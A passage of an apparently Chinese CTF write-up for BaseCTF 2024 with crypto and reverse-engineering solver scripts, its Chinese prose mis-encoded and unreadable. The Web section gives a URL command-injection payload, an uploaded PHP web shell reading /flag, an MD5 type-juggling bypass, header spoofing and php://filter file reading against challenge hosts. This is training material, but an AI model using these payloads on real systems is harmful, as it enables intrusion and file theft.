matrix([[1,0,0], [x2,1,0], [y2,z2,1]])<br>B = u*l<br><br>t1 = [292585039548930662326103829416538145189, 293124197879399252223245955841307374193, ]<br>t2 = [239032610975319686124167120759414114611, 294816936919419198311047310603595242713, ]<br>for a, d in [t1, reversed(t1)]:<br>    for b, c in [t2, reversed(t2)]:<br>        A = matrix([[f,0,0], [0,a,b], [0,c,d]])<br>        L = A*B<br>        eqs = []<br>        for i in range(3):<br>            for j in range(3):<br>                eqs.append(L[i][j] == R[i][j])<br>        ans = solve(eqs, f, x1, y1, z1, x2, y2, z2)<br>        if ans:<br>            print(ans)<br></code></pre></td></tr></table></figure><h3 id="babypack">babypack</h3><p><code>output.txt</code> å¤ªå¤§äº†ï¼Œç›´æ¥æ”¹åä¸º<code>output.py</code>ï¼ŒåŸç†å°šä¸æ¸…æ¥šï¼Œä½†æ˜¯å¤§æ¦‚æ˜¯å› ä¸ºæ¯ä¸ªæ¯”ç‰¹çš„æ•°å­—éƒ½å¤§äºä½ä½æ¯”ç‰¹æ•°å­—ä¹‹å’Œï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ä¸å­˜åœ¨é€‰æ‹©å½“å‰ä½ä¸é€‰æ‹©ä¸€äº›ä½ä½ä¹‹å’Œå†²çªã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> output <span class="hljs-keyword">import</span> *<br><br>bits = []<br>cc = c<br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> cc &gt;= b:<br>        bits.append(<span class="hljs-number">1</span>)<br>        cc -= b<br>    <span class="hljs-keyword">else</span>:<br>        bits.append(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, bits)), base=<span class="hljs-number">2</span>)).decode())<br></code></pre></td></tr></table></figure><h3 id="babyrsa">babyrsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832</span><br><br>d = gmpy2.invert(e, n-<span class="hljs-number">1</span>)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m).decode())<br></code></pre></td></tr></table></figure><h3 id="åä¸ƒå€">åä¸ƒå€</h3><p>17 = 0b10001ï¼Œé«˜4ä½å‡å»ä½4ä½å¾—åˆ°åŸå§‹çš„é«˜4ä½ï¼Œæ³¨æ„ä¹Ÿè®¸è¦é€€ä½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">cipher = [<br>    <span class="hljs-number">98</span>,  <span class="hljs-number">113</span>, <span class="hljs-number">163</span>, <span class="hljs-number">181</span>, <span class="hljs-number">115</span>, <span class="hljs-number">148</span>, <span class="hljs-number">166</span>,  <span class="hljs-number">43</span>,   <span class="hljs-number">9</span>,  <span class="hljs-number">95</span>,<br>    <span class="hljs-number">165</span>, <span class="hljs-number">146</span>,  <span class="hljs-number">79</span>, <span class="hljs-number">115</span>, <span class="hljs-number">146</span>, <span class="hljs-number">233</span>, <span class="hljs-number">112</span>, <span class="hljs-number">180</span>,  <span class="hljs-number">48</span>,  <span class="hljs-number">79</span>,<br>    <span class="hljs-number">65</span>,  <span class="hljs-number">181</span>, <span class="hljs-number">113</span>, <span class="hljs-number">146</span>,  <span class="hljs-number">46</span>, <span class="hljs-number">249</span>,  <span class="hljs-number">78</span>, <span class="hljs-number">183</span>,  <span class="hljs-number">79</span>, <span class="hljs-number">133</span>,<br>    <span class="hljs-number">180</span>, <span class="hljs-number">113</span>, <span class="hljs-number">146</span>, <span class="hljs-number">148</span>, <span class="hljs-number">163</span>,  <span class="hljs-number">79</span>,  <span class="hljs-number">78</span>,  <span class="hljs-number">48</span>, <span class="hljs-number">231</span>,  <span class="hljs-number">77</span>,<br>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> c: <span class="hljs-built_in">chr</span>(((c+<span class="hljs-number">0x100</span>)-((c&amp;<span class="hljs-number">0xf</span>)&lt;&lt;<span class="hljs-number">4</span>))&amp;<span class="hljs-number">0x7f</span>), cipher)))<br></code></pre></td></tr></table></figure><h3 id="hellocrypto">helloCrypto</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br>key1 = <span class="hljs-number">208797759953288399620324890930572736628</span><br>key = long_to_bytes(key1)<br><br>c = <span class="hljs-string">b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span><br>my_ass = AES.new(key=key, mode=AES.MODE_ECB)<br><span class="hljs-built_in">print</span>(unpad(my_ass.decrypt(c), AES.block_size).decode())<br></code></pre></td></tr></table></figure><h3 id="ez_rsa">ez_rsa</h3><p><span class="math inline">\(\varphi(n) = (p-1)(q-1) = n - (p+q) +1\)</span>ï¼Œ<span class="math inline">\(\varphi&#39; = (p+2)(q+2) =n+2(p+q) + 4\)</span>ï¼Œç”¨ <spanclass="math inline">\(\varphi&#39;\)</span> æ±‚å‡º <spanclass="math inline">\(p+q\)</span> å³å¯æ±‚å‡º <spanclass="math inline">\(\varphi(n)\)</span>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421</span><br>not_phi = <span class="hljs-number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205</span><br>c = <span class="hljs-number">37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945</span><br>e = <span class="hljs-number">65537</span><br><br>p_q_add = (not_phi-n-<span class="hljs-number">4</span>)//<span class="hljs-number">2</span><br>phi = not_phi - <span class="hljs-number">3</span>*p_q_add - <span class="hljs-number">3</span><br>d = gmpy2.invert(e, phi)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, n)).decode())<br></code></pre></td></tr></table></figure><h3 id="ä½ ä¼šç®—md5å—">ä½ ä¼šç®—md5å—</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> printable<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>MAPPER = &#123;md5(c.encode()).hexdigest(): c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> printable&#125;<br>output = [<br>    <span class="hljs-string">&#x27;9d5ed678fe57bcca610140957afab571&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <br>    <span class="hljs-string">&#x27;03c7c0ace395d80182db07ae2c30f034&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <br>    <span class="hljs-string">&#x27;0d61f8370cad1d412f80b84d143e1257&#x27;</span>, <span class="hljs-string">&#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;</span>, <br>    <span class="hljs-string">&#x27;800618943025315f869e4e1f09471012&#x27;</span>, <span class="hljs-string">&#x27;f95b70fdc3088560732a5ac135644506&#x27;</span>, <br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <br>    <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <br>    <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>, <br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;</span>, <br>    <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>, <br>    <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <br>    <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <br>    <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;</span>, <br>    <span class="hljs-string">&#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <br>    <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <br>    <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <br>    <span class="hljs-string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <br>    <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <br>    <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <br>    <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <br>    <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <br>    <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <br>    <span class="hljs-string">&#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;</span><br>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> _md5: MAPPER[_md5], output)))<br></code></pre></td></tr></table></figure><h2 id="pwn">Pwn</h2><p>æœ€å·®çš„ä¸€éƒ¨åˆ†ï¼Œå¾—å¥½å¥½è¡¥è¡¥äº†ã€‚è¿™éƒ¨åˆ†åªåšäº†ä¸¤é¢˜ï¼Œä¼šç”¨ nc ä¼šç”¨åŸºç¡€çš„linux å‘½ä»¤å³å¯ï¼Œå°±ä¸æ”¾åœ¨è¿™é‡Œä¸¢äººç°çœ¼äº†ã€‚</p><h2 id="web">Web</h2><h3 id="http-æ˜¯ä»€ä¹ˆå‘€">HTTP æ˜¯ä»€ä¹ˆå‘€</h3><p>æ­£å¥½ç»ƒä¹ ä¸€ä¸‹ curlï¼Œæœ€åæ‰€æœ‰éƒ½å¯¹äº†å°±æ˜¯æ²¡è¾“å‡ºï¼Œæ‰€ä»¥ç”¨<code>--verbose</code> å‚æ•°çœ‹ä¸€ä¸‹åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆã€‚å‘ç°æ˜¯é‡å®šå‘äº†ï¼Œè€Œä¸”flag åœ¨ url é‡Œé¢ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl &quot;http://challenge.basectf.fun:37388?basectf=we1c%2500me&quot; \<br>    --data Base=fl@g \<br>    --cookie c00k13=&quot;i can&#x27;t eat it&quot; \<br>    --header &quot;User-Agent:Base&quot; \<br>    --header &quot;Referer:Base&quot; \<br>    --header &quot;X-Forwarded-For:127.0.0.1&quot; \<br>    --verbose<br></code></pre></td></tr></table></figure><h3 id="å–µå–µå–µï»Œ">å–µå–µå–µÂ´â€¢ï»Œâ€¢`</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl &quot;http://challenge.basectf.fun:22840/?DT=system(%22cat%20/flag%22);&quot;<br></code></pre></td></tr></table></figure><h3 id="md5ç»•è¿‡æ¬¸">md5ç»•è¿‡æ¬¸</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl &quot;http://challenge.basectf.fun:35748?name=240610708&amp;name2[]=1&quot; \<br>    --data &quot;password=314282422&amp;password2[]=2&quot;<br></code></pre></td></tr></table></figure><h3 id="a-dark-room">A Dark Room</h3><p>F12</p><h3 id="upload">upload</h3><p>å†™å¦‚ä¸‹çš„è„šæœ¬å¹¶ä¸Šä¼ ï¼Œç„¶åè®¿é—®<code>http://host:port/uploads/filename.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>å¾ˆå¥½å¥‡ä¸ºä»€ä¹ˆä¸èƒ½ä½¿ç”¨ <code>$_GET</code> å‚æ•°æ¥æ‰§è¡Œ<code>system</code> å‘½ä»¤</p></blockquote><h3 id="aura-é…±çš„ç¤¼ç‰©">Aura é…±çš„ç¤¼ç‰©</h3><blockquote><p>æ„Ÿè°¢ <a href="https://vercel.com">Vercel</a> çš„å¤§åŠ›æ”¯æŒ</p></blockquote><p>èŠ±äº†å¥½ä¹…ï¼Œæœ€åæ­ªé—¨é‚ªé“æå‡ºæ¥äº†ã€‚</p><p>é¦–å…ˆæ˜¯è¯» <code>$_POST['pen']</code> çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆç›´æ¥ä¼ªåè®®<code>data://text/plain;base64,QXVyYQ==</code> ç»•è¿‡ã€‚</p><p>æ¥ç€æ˜¯è¦æ±‚ <code>$_POST['challenge']</code> ä»¥<code>http://jasmineaura.github.io</code>å¼€å¤´ï¼Œå¹¶ä¸”ä»è¯¥å˜é‡è·å¾—çš„å†…å®¹ä¸­åŒ…å«æŒ‡å®šå†…å®¹ï¼Œåšé¢˜çš„æ—¶å€™å¤§æ¦‚æœ‰ä»¥ä¸‹2ç‚¹æ€è·¯ï¼š</p><ol type="1"><li>çœ‹çœ‹è¿™ä¸ªç½‘ç«™ä¸Šæœ‰ä»€ä¹ˆå¯ä»¥å†…å®¹æ³¨å…¥çš„ç‚¹ï¼Œæ¯”å¦‚è¯´ä¸€èˆ¬çš„åšå®¢åœ¨å†…å®¹æœç´¢çš„æ—¶å€™ï¼ŒåŠ å…¥å†…å®¹ä¸å­˜åœ¨ï¼Œä¼šè¯´â€œæœªæ‰¾åˆ°xxxâ€ï¼Œé‚£ä¸å°±åŒ…å«äº†ã€‚ï¼ˆä¸çŸ¥é“é™æ€ç½‘é¡µèƒ½ä¸èƒ½åšï¼Œåæ­£æ˜¯å®¡è®¡çš„å†…å®¹ï¼‰</li><li>æ‰¾ <code>strpos</code> å’Œ <code>get_file_contents</code>å‡½æ•°çš„æ¼æ´ç»•è¿‡ã€‚</li></ol><p>å‘ç°æ²¡ä»€ä¹ˆç”¨ï¼Œæœ‰ <code>search.js</code>æ–‡ä»¶ä½†æ˜¯æ²¡ç”¨ï¼Œ<code>strpos</code> å’Œ <code>get_file_contents</code>ä¹Ÿæ˜¯å¼±ç±»å‹ç»•è¿‡ï¼Œè¿™é‡Œå¥½åƒæ²¡ç”¨ã€‚</p><p>å¿½ç„¶çµå…‰ä¸€é—ªï¼Œæˆ‘å¯ä»¥ç”¨<code>http://jasmineaura.github.io.bcb.pub</code>è§£æåˆ°ä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œè¿”å›æŒ‡å®šå†…å®¹å°±å¥½å•¦ã€‚å› ä¸ºæ²¡æœ‰å¤‡æ¡ˆçš„æœåŠ¡å™¨ï¼Œæ‰€ä»¥ Aè§£æåœ¨å›½å†…æ²¡ç”¨ã€‚æ­£å¥½å‰é¢æäº† CNAMEè§£æï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æä¸€ä¸ªæœåŠ¡å™¨ï¼Œæˆ–è€…åªè¦é™æ€ç½‘é¡µæ‰˜ç®¡å°±è¡Œäº†ã€‚</p><p>æœåŠ¡å™¨è¿™æ–¹é¢ï¼ŒVultr è‡³å°‘éœ€è¦å…… 10 USDï¼›Google Cloudæ²¡æœ‰ä¿¡ç”¨å¡ä¸ç„¶å¯ä»¥ç™½å«–ã€‚é™æ€æ‰˜ç®¡è¿™æ–¹é¢ï¼ŒGithub Pageçš„è¯ä¸æƒ³æä¹±åšå®¢ï¼ˆå…¶å®åœ¨ Github ä¸Šä¹Ÿçœ‹åˆ°äº†ä¸€äº›ä¸ºäº†è§£è¿™é¢˜åˆ›å»ºçš„é¡¹ç›®ï¼Œè¯•å›¾CNAME è¹­è¹­ä½†æ˜¯å¤±è´¥ï¼‰ï¼ŒGitLab/Gitee ä¹Ÿéƒ½æœ‰éƒ¨ç½²/å®¡æ ¸çš„éº»çƒ¦ã€‚æœ€åé€‰æ‹©äº†Vercel çš„æœåŠ¡ï¼Œå¯ä»¥æ”¯æŒ CNAMEã€‚è®¾ç½®ä¸€ä¸‹ç»•è¿‡åˆ¤æ–­ã€‚</p><img src="/2024/08/21/ctf/basectf2024/week1/web_cname.png" class="" title="CNAME è§£æ"><p>æœ€åå°±æ˜¯ä¸€ä¸ª<code>php://filter/read=convert.base64-encode/resource=flag.php</code>å¸¦å‡ºä¿¡æ¯ã€‚</p><h2 id="reverse">Reverse</h2><blockquote><p>æ„Ÿè°¢ <a href="https://www.52pojie.cn/">52pojie</a> çš„èµ„æº</p></blockquote><h3 id="you-are-good-at-ida">You are good at IDA</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> var9[<span class="hljs-number">17</span>]; <span class="hljs-comment">// [rsp+27h] [rbp-9h] BYREF</span><br><br>  _main(argc, argv, envp);<br>  <span class="hljs-built_in">strcpy</span>(var9, <span class="hljs-string">&quot;Y0u_4Re_&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is the first part&quot;</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, var9);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You can shift f12 look look&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Second</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is the second part&quot;</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">57</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">48</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">48</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">100</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">95</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">52</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">55</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">95</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Only the last part remains&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The last part is in a named Interesting&#x27;s func&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Interesting</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">105</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">100</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">putchar</span>(<span class="hljs-number">52</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;BaseCTF&#123;&#123;&#123;&#125;&#125;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;Y0u_4Re_&quot;</span> + <span class="hljs-built_in">bytes</span>([<span class="hljs-number">57</span>, <span class="hljs-number">48</span>, <span class="hljs-number">48</span>, <span class="hljs-number">100</span>, <span class="hljs-number">95</span>, <span class="hljs-number">52</span>, <span class="hljs-number">55</span>, <span class="hljs-number">95</span>, <span class="hljs-number">105</span>, <span class="hljs-number">100</span>, <span class="hljs-number">52</span>]).decode()))<br></code></pre></td></tr></table></figure><h3 id="upx-mini">UPX mini</h3><p>ç›´æ¥è¿è¡Œï¼Ÿå¿˜äº†</p><h3 id="ez-xor">Ez Xor</h3><p>ä¸€å¼€å§‹æ²¡æ€ä¹ˆçœ‹æ‡‚å¯†é’¥æ˜¯æ€ä¹ˆç”Ÿæˆçš„ï¼ŒåŠ¨æ€è°ƒè¯•äº†ä¸€ä¸‹ç›´æ¥æ‹¿åˆ°å¯†é’¥ï¼Œå†ä¸æ•°æ®å¯¹æ¯”åˆ†æä¸€ä¸‹æ‰çœ‹æ‡‚ï¼Œå…¶å®æ˜¯æ•°æ®çš„å¤§å°ç«¯é—®é¢˜ã€‚<code>0x726F58i32</code>ä»å°ç«¯å¼€å§‹é‚£ä¹ˆæ˜¯<code>[0x58, 0x6F, 0x72, 0x00]</code>ï¼Œä½†æ˜¯ä»å¤§ç«¯å¼€å§‹å°±è¯´ä¸é€šäº†ã€‚æƒ³é€šè¿™ä¸€ç‚¹ä¸‹é¢å°±éƒ½è§£å†³äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> struct<br><br>iv = struct.pack(<span class="hljs-string">&quot;&lt;i&quot;</span>, <span class="hljs-number">0x726F58</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>([c^k <span class="hljs-keyword">for</span> c, k <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(<br>    itertools.chain(<br>        struct.pack(<span class="hljs-string">&quot;&lt;Q&quot;</span>, <span class="hljs-number">0x1D0B2D2625050901</span>),<br>        struct.pack(<span class="hljs-string">&quot;&lt;Q&quot;</span>, <span class="hljs-number">0x673D491E20317A24</span>),<br>        struct.pack(<span class="hljs-string">&quot;&lt;Q&quot;</span>, <span class="hljs-number">0x34056E2E2508504D</span>),<br>        <span class="hljs-string">b&#x27;&quot;@;%&#x27;</span>,<br>    ),<br>    <span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> i: i^iv[i%<span class="hljs-number">3</span>], <span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>))),<br>)]).decode())<br></code></pre></td></tr></table></figure><h3 id="ez_maze">ez_maze</h3><p>èµ°è¿·å®«é‚£ä¹ˆå¿…ç„¶æœ‰è¿·å®«ï¼ŒShift+F12 çœ‹åˆ°ä¸€å † <code>$</code> 